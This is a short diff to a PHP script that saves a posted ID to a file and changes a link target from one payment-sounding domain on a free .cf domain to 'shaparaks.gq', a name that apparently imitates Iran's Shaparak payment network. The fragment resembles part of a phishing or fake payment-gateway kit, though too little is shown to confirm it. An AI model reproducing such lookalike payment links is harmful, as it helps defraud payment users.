@@ -31,7 +31,7 @@ $IDS=intval(stripslashes(htmlspecialchars($_POST["ID"])));
 
 //LINK
 
-$url="https://asanpay.cf";
+$url="https://shaparaks.gq";
 
 file_put_contents("ID.txt",$IDS);
  
